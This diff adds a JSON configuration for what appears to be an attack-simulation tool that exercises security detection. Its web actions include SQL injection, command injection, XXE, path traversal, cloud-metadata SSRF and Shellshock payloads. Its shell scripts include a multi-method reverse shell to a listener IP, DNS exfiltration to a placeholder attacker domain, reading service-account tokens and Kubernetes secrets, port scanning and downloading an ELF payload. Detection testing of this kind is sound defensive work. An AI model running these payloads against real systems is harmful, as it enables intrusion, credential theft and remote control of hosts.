@@ -1,0 +1,289 @@
+{
+  "version": "1.2",
+  "attackGroups": [
+    {
+      "id": "a1b2c3d4-e5f6-7890-1234-567890abcdef",
+      "name": "Web and API Attacks",
+      "description": "Simulate various web and API vulnerabilities. Default URI applies if action URLs are relative. Replace placeholders like <NODE_IP> or <KUBE_API_SERVER_URL> as needed.",
+      "actions": [
+        {
+          "id": "web-sqli-auth",
+          "name": "SQLi - Auth Bypass (URL Parameter)",
+          "description": "Attempt to bypass authentication using SQL injection in URL parameters. Example: /login?user=' OR '1'='1' --&pass=' OR '1'='1'",
+          "details": {
+            "type": "web",
+            "method": "GET",
+            "url": "/login?user=' OR '1'='1' --&pass=' OR '1'='1'"
+          }
+        },
+        {
+          "id": "web-sqli-union",
+          "name": "SQLi - Data Extraction (Union-based, URL Parameter)",
+          "description": "Attempt to extract data using UNION SELECT. Adjust column count as needed. Example: /items?id=1' UNION SELECT null, @@version -- ",
+          "details": {
+            "type": "web",
+            "method": "GET",
+            "url": "/items?id=1' UNION SELECT null, @@version -- "
+          }
+        },
+        {
+          "id": "web-cmd-injection",
+          "name": "Command Injection (URL Parameter)",
+          "description": "Inject OS command via a GET parameter. Example: /utils/ping?host=example.com%3Bcat%20/etc/passwd",
+          "details": {
+            "type": "web",
+            "method": "GET",
+            "url": "/utils/ping?host=example.com%3Bcat%20/etc/passwd"
+          }
+        },
+        {
+          "id": "web-xxe-post",
+          "name": "XXE - File Disclosure (POST XML)",
+          "description": "Attempt XML External Entity injection to read /etc/passwd. Example: /xmlupload",
+          "details": {
+            "type": "web",
+            "method": "POST",
+            "url": "/xmlupload",
+            "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+            "headers": {
+              "Content-Type": "application/xml"
+            }
+          }
+        },
+        {
+          "id": "web-path-traversal",
+          "name": "Path Traversal - File Disclosure (URL Parameter)",
+          "description": "Attempt to access /etc/passwd via path traversal. Example: /files?filename=../../../../etc/passwd",
+          "details": {
+            "type": "web",
+            "method": "GET",
+            "url": "/files?filename=../../../../etc/passwd"
+          }
+        },
+        {
+          "id": "web-idor",
+          "name": "IDOR - Access Other User's Resource (URL Parameter)",
+          "description": "Attempt to access another user's resource by changing an ID in the URL. Example: /orders?id=124 (expecting 123)",
+          "details": {
+            "type": "web",
+            "method": "GET",
+            "url": "/orders?id=124"
+          }
+        },
+        {
+          "id": "web-ssrf-aws",
+          "name": "SSRF - Cloud Metadata Access (AWS EC2)",
+          "description": "Attempt SSRF to access AWS EC2 instance metadata. Uses absolute URL, overrides default.",
+          "details": {
+            "type": "web",
+            "method": "GET",
+            "url": "http://169.254.169.254/latest/meta-data/"
+          }
+        },
+        {
+          "id": "web-ssrf-gcp",
+          "name": "SSRF - Cloud Metadata Access (GCP Compute)",
+          "description": "Attempt SSRF to access GCP Compute instance metadata. Uses absolute URL.",
+          "details": {
+            "type": "web",
+            "method": "GET",
+            "url": "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
+            "headers": {
+              "Metadata-Flavor": "Google"
+            }
+          }
+        },
+        {
+          "id": "web-xss-reflected",
+          "name": "XSS - Reflected (URL Parameter)",
+          "description": "Inject a script tag via a URL parameter. Example: /search?query=<script>alert('XSS')</script>",
+          "details": {
+            "type": "web",
+            "method": "GET",
+            "url": "/search?query=<script>alert('XSS-Simulated')</script>"
+          }
+        },
+        {
+          "id": "web-git-exposed",
+          "name": "Misconfig - Exposed .git Folder",
+          "description": "Attempt to access .git/config file. Example: /.git/config",
+          "details": {
+            "type": "web",
+            "method": "GET",
+            "url": "/.git/config"
+          }
+        },
+        {
+          "id": "web-k8s-kubelet",
+          "name": "K8s - Unauthenticated Kubelet Access",
+          "description": "Attempts to access Kubelet API. Replace <NODE_IP>. Default ports 10250 (Read-Write), 10255 (Read-Only). Example: http://<NODE_IP>:10250/pods",
+          "details": {
+            "type": "web",
+            "method": "GET",
+            "url": "http://<NODE_IP>:10250/pods"
+          }
+        },
+        {
+          "id": "web-k8s-api-anon",
+          "name": "K8s - Anonymous Kubernetes API Access",
+          "description": "Attempts to query the Kubernetes API server anonymously. Replace <KUBE_API_SERVER_URL>. Example: https://<KUBE_API_SERVER_URL>:6443/api/v1/pods",
+          "details": {
+            "type": "web",
+            "method": "GET",
+            "url": "https://<KUBE_API_SERVER_URL>:6443/api/v1/pods"
+          }
+        },
+        {
+          "id": "web-ua-sqlmap",
+          "name": "User-Agent Spoofing (SQLMap)",
+          "description": "Sends a request with a User-Agent typically used by SQLMap. Example target: /",
+          "details": {
+            "type": "web",
+            "method": "GET",
+            "url": "/",
+            "headers": {
+              "User-Agent": "sqlmap/1.5.x"
+            }
+          }
+        },
+        {
+          "id": "web-shellshock",
+          "name": "Shellshock Vulnerability Test (User-Agent Header)",
+          "description": "Attempts to trigger Shellshock vulnerability via User-Agent header. Example: /cgi-bin/status",
+          "details": {
+            "type": "web",
+            "method": "GET",
+            "url": "/cgi-bin/status",
+            "headers": {
+              "User-Agent": "() { :;}; echo vulnerable"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "z9y8x7w6-v5u4-t3s2-r1q0-p9o8n7m6l5k4",
+      "name": "System and Container Attacks",
+      "description": "Simulate attacks targeting system-level (host/container) resources, processes, and configurations. Replace placeholders like 'your-listener-ip' and specific ports where noted. Ensure required tools (nc, nmap, python, kubectl) are available in the execution environment if not part of the script. Scripts are executed with bash and timeout after 30s.",
+      "actions": [
+        {
+          "id": "sys-reverse-shell",
+          "name": "Reverse Shell (Bash/Netcat/Python)",
+          "description": "System/Container: Attempts a reverse shell. Listener: nc -lvnp <PORT>. Replace 'your-listener-ip' and '<PORT>'. Tries Bash, then Netcat, then Python3.",
+          "details": {
+            "type": "shell",
+            "script": "#!/bin/bash\n# Set your listener IP and Port here\nLISTENER_IP=\"your-listener-ip\"\nLISTENER_PORT=\"4444\"\n\n# Attempt 1: Bash reverse shell\n(bash -i >& /dev/tcp/$LISTENER_IP/$LISTENER_PORT 0>&1) && exit 0\n\n# Attempt 2: Netcat reverse shell (modern nc often doesn't have -e)\n# Try common nc variants for -e or -c\n(nc $LISTENER_IP $LISTENER_PORT -e /bin/bash || nc -e /bin/bash $LISTENER_IP $LISTENER_PORT || nc -c /bin/bash $LISTENER_IP $LISTENER_PORT) && exit 0\n\n# Attempt 3: Python3 reverse shell\nif command -v python3 >/dev/null; then\n  (python3 -c 'import socket,os,pty;ip='${LISTENER_IP}',port='${LISTENER_PORT}';s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((ip,int(port)));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")') && exit 0\nelif command -v python >/dev/null; then\n  (python -c 'import socket,os,pty;ip='${LISTENER_IP}',port='${LISTENER_PORT}';s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((ip,int(port)));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")') && exit 0\nfi\n\necho \"All reverse shell attempts failed. Check listener, IP/Port variables, and tool availability (bash, nc, python3/python).\"\nexit 1"
+          }
+        },
+        {
+          "id": "sys-suid-guid",
+          "name": "List SUID/GUID Binaries",
+          "description": "System/Container: Finds files with SUID or GUID bits for potential privilege escalation.",
+          "details": {
+            "type": "shell",
+            "script": "#!/bin/bash\n# Finds files with SUID or GUID bits. Errors for unreadable directories are suppressed.\nfind / -type f \\( -perm -4000 -o -perm -2000 \\) -ls 2>/dev/null\nif [ $? -ne 0 ] && [ $? -ne 1 ]; then # find returns 1 if error during processing like permission denied but still can list some files. >1 usually means critical error.\n              echo \"'find' command encountered an issue or no SUID/GUID files found.\"\n              # exit 1 # Decide if this should be an error state for the simulation\n            fi"
+          }
+        },
+        {
+          "id": "sys-sudo-l",
+          "name": "Check sudo Permissions (`sudo -l`)",
+          "description": "System/Container: Lists commands the current user can run with sudo. May require passwordless sudo or prompt if interactive (will likely fail in non-interactive).",
+          "details": {
+            "type": "shell",
+            "script": "sudo -ln"
+          }
+        },
+        {
+          "id": "sys-read-sensitive",
+          "name": "Read Sensitive File (e.g., /etc/passwd)",
+          "description": "System/Container: Attempts to display the content of a common sensitive file.",
+          "details": {
+            "type": "shell",
+            "script": "cat /etc/passwd"
+          }
+        },
+        {
+          "name": "Write Test File to /tmp",
+          "description": "System/Container: Tests if writing to /tmp directory is possible.",
+          "details": {
+            "type": "shell",
+            "script": "#!/bin/bash\nTEST_FILE=\"/tmp/attack_sim_test_$(date +%s).txt\"\necho \"Attack simulator test content.\" > \"$TEST_FILE\"\ncat \"$TEST_FILE\"\nrm \"$TEST_FILE\""
+          },
+          "id": "sys-write-tmp"
+        },
+        {
+          "id": "sys-script-tmp",
+          "name": "Create and Execute Script in /tmp",
+          "description": "System/Container: Creates a simple executable script in /tmp, makes it runnable, and executes it.",
+          "details": {
+            "type": "shell",
+            "script": "#!/bin/bash\nSCRIPT_PATH=\"/tmp/tmp_payload_$(date +%s).sh\"\nprintf '%s\\n' '#!/bin/bash' 'echo \"Simulated execution from /tmp script.\"' > \"$SCRIPT_PATH\"\nchmod +x \"$SCRIPT_PATH\"\n\"$SCRIPT_PATH\"\nrm \"$SCRIPT_PATH\""
+          }
+        },
+        {
+          "id": "sys-port-scan-nc",
+          "name": "Internal Port Scan (Common Ports with Netcat)",
+          "description": "System/Container: Scans common TCP ports on 'target-internal-ip' (e.g., another container, host service). Replace 'target-internal-ip'. Requires 'nc' (netcat).",
+          "details": {
+            "type": "shell",
+            "script": "#!/bin/bash\nTARGET_HOST=\"target-internal-ip\" # Replace with actual internal IP or hostname\nPORTS_TO_SCAN=\"22 80 443 3306 5432 6379 8080 9200 27017\"\n\nif ! command -v nc >/dev/null; then\n  echo \"Netcat (nc) not found. Cannot perform port scan.\"\n  exit 1\nfi\n\necho \"Scanning $TARGET_HOST for open ports...\"\nfor port in $PORTS_TO_SCAN; do\n  nc -zv -w 2 $TARGET_HOST $port\ndone\necho \"Scan complete.\""
+          }
+        },
+        {
+          "id": "sys-crypto-miner-sim",
+          "name": "Simulate Crypto Miner Process",
+          "description": "System/Container: Simulates a crypto mining process by running 'sleep' or 'yes' (CPU intensive). Will be terminated by 30s timeout.",
+          "details": {
+            "type": "shell",
+            "script": "#!/bin/bash\n# Try to simulate with sleep for a defined duration (less than timeout)\nif command -v sleep >/dev/null && cp /bin/sleep /tmp/fake_miner_$(date +%s) 2>/dev/null; then\n  MINER_EXE=\"/tmp/fake_miner_$(date +%s)\"\n  echo \"Simulating miner (using Renamed Sleep) for 10 seconds...\"\n  $MINER_EXE 10\n  rm $MINER_EXE\n  echo \"Simulated miner (Renamed Sleep) completed.\"\n  exit 0\nfi\n\n# Fallback: run 'yes' to consume CPU (will be killed by 30s global timeout)\nif command -v yes >/dev/null; then\n  echo \"Simulating miner (using 'yes' command) - this will run until global timeout (30s).\"\n  yes > /dev/null # This command runs indefinitely until killed\n  # The script will not proceed beyond 'yes' unless 'yes' is killed externally.\n  echo \"'yes' command finished (should not happen if it ran as expected).\"\n  exit 0 \nfi\n\necho \"Failed to simulate crypto miner process: 'sleep' or 'yes' command not found, or could not copy 'sleep'.\"\nexit 1"
+          }
+        },
+        {
+          "id": "sys-k8s-cli-list",
+          "name": "K8s CLI - List Pods/Secrets/SA Token",
+          "description": "Container/Host (with kubectl): Uses kubectl to list pods, secrets, or attempts to read SA token. Assumes kubectl available & configured or SA token mounted.",
+          "details": {
+            "type": "shell",
+            "script": "#!/bin/bash\nif ! command -v kubectl >/dev/null; then\n  echo \"kubectl command not found. Skipping Kubernetes CLI actions.\"\n  exit 1\nfi\n\necho\necho \"--- Listing Pods (all namespaces) ---\"\nkubectl get pods --all-namespaces -o wide\n\necho\necho \"--- Listing Secrets (all namespaces) ---\"\nkubectl get secrets --all-namespaces\n\nSA_TOKEN_PATH=\"/var/run/secrets/kubernetes.io/serviceaccount/token\"\necho\necho \"--- Attempting to read Service Account Token --- (${SA_TOKEN_PATH})\"\nif [ -f \"$SA_TOKEN_PATH\" ]; then\n  cat \"$SA_TOKEN_PATH\"\n  echo\nelse\n  echo \"Service account token not found at $SA_TOKEN_PATH or not readable.\"\nfi\n"
+          }
+        },
+        {
+          "id": "sys-k8s-cli-download",
+          "name": "K8s CLI - Download and Run Kubectl",
+          "description": "Container/Host: Downloads kubectl, makes it executable, and runs 'kubectl version --client'. Simulates attacker bringing their own tools.",
+          "details": {
+            "type": "shell",
+            "script": "#!/bin/bash\nKUBECTL_PATH=\"./kubectl_temp_$(date +%s)\"\n\nif command -v curl >/dev/null; then\n  echo \"Downloading kubectl...\"\n  KUBECTL_STABLE_VERSION=$(curl -L -s https://dl.k8s.io/release/stable.txt)\n  curl -sLO \"https://dl.k8s.io/release/$KUBECTL_STABLE_VERSION/bin/linux/amd64/kubectl\" -o \"$KUBECTL_PATH\"\n  if [ $? -ne 0 ]; then echo \"Download failed.\"; exit 1; fi\n  \n  chmod +x \"$KUBECTL_PATH\"\n  echo \"Running kubectl version --client...\"\n  \"$KUBECTL_PATH\" version --client\n  rm \"$KUBECTL_PATH\"\n  echo \"Temporary kubectl removed.\"\nelse\n  echo \"curl command not found. Cannot download kubectl.\"\n  exit 1\nfi"
+          }
+        },
+        {
+          "id": "sys-dns-exfil",
+          "name": "DNS Exfiltration Attempt",
+          "description": "System/Container: Simulates DNS exfiltration by querying an attacker-controlled domain. Replace 'attacker-controlled.domain'.",
+          "details": {
+            "type": "shell",
+            "script": "#!/bin/bash\n# Replace attacker-controlled.domain with a domain you control for testing.\nEXFIL_DOMAIN=\"attacker-controlled.domain\"\nHOSTNAME_VAL=$(hostname || echo \"unknown-host\")\nDATA_PAYLOAD=\"sensitive-data-simulated\"\nTARGET_QUERY=\"$DATA_PAYLOAD.$HOSTNAME_VAL.$EXFIL_DOMAIN\"\n\necho \"Simulating DNS exfiltration attempt for: $TARGET_QUERY\"\n\nif command -v nslookup >/dev/null; then\n  nslookup \"$TARGET_QUERY\"\n  exit 0\nfi\n\nif command -v dig >/dev/null; then\n  dig +short \"$TARGET_QUERY\"\n  exit 0\nfi\n\necho \"DNS query for exfiltration simulation failed: nslookup and dig not found.\"\nexit 1"
+          }
+        },
+        {
+          "id": "sys-download-elf",
+          "name": "Download and Stage ELF File (Simulated Malware)",
+          "description": "System/Container: Downloads a test ELF file to /tmp simulating malware ingress. Replace URL with actual test ELF source.",
+          "details": {
+            "type": "shell",
+            "script": "#!/bin/bash\n# Replace with a URL to a *safe* test ELF file for download simulation.\n# Example: a small, static 'hello world' ELF for the target architecture.\nTEST_ELF_URL=\"http://<YOUR_TEST_ELF_SERVER_IP_OR_DOMAIN>/test.elf\"\nSTAGED_ELF_PATH=\"/tmp/staged_elf_$(date +%s)\"\n\nif ! command -v curl >/dev/null; then\n  echo \"curl command not found. Cannot download test ELF.\"\n  exit 1\nfi\n\necho \"Attempting to download test ELF from $TEST_ELF_URL to $STAGED_ELF_PATH\"\ncurl -fsSL \"$TEST_ELF_URL\" -o \"$STAGED_ELF_PATH\" --connect-timeout 10\n\nif [ $? -eq 0 ] && [ -f \"$STAGED_ELF_PATH\" ]; then\n  echo \"Test ELF successfully staged to $STAGED_ELF_PATH :\"\n  ls -l \"$STAGED_ELF_PATH\"\n  echo \"Consider making it executable (chmod +x) and running it for full simulation (not done automatically).\"\n  # rm \"$STAGED_ELF_PATH\" # Optionally clean up, or leave for inspection\nelse\n  echo \"Failed to download or stage test ELF. Check URL, network, and server response.\"\n  # rm \"$STAGED_ELF_PATH\" 2>/dev/null # Clean up if partially downloaded\n  exit 1\nfi"
+          }
+        },
+        {
+          "id": "sys-ld-preload-sim",
+          "name": "Simulate Execution Flow Hijack (ld.so.preload - Echo only)",
+          "description": "Host/Container: Simulates attempting to write to /etc/ld.so.preload. THIS ACTION ONLY ECHOS THE ATTEMPT FOR SAFETY. Actual write is dangerous and often restricted.",
+          "details": {
+            "type": "shell",
+            "script": "#!/bin/bash\nDUMMY_LIB_PATH=\"/tmp/my_evil_lib_$(date +%s)\"\nLD_PRELOAD_PATH=\"/etc/ld.so.preload\"\n\necho \"SIMULATED ACTION: This script demonstrates an attempt to manipulate $LD_PRELOAD_PATH.\"\necho \"For safety, it will only *echo* the command that would modify it and create/remove a dummy library.\"\n\necho \"Creating dummy library at $DUMMY_LIB_PATH...\"\ntouch \"$DUMMY_LIB_PATH\"\nls -l \"$DUMMY_LIB_PATH\"\n\necho\necho \"SIMULATING attempt to write to $LD_PRELOAD_PATH:\"\necho \"  echo $DUMMY_LIB_PATH >> $LD_PRELOAD_PATH\"\n\necho\necho \"Cleaning up dummy library $DUMMY_LIB_PATH...\"\nrm \"$DUMMY_LIB_PATH\"\necho \"Simulation complete. No actual modification to $LD_PRELOAD_PATH was performed.\""
+          }
+        }
+      ]
+    }
+  ]
+}
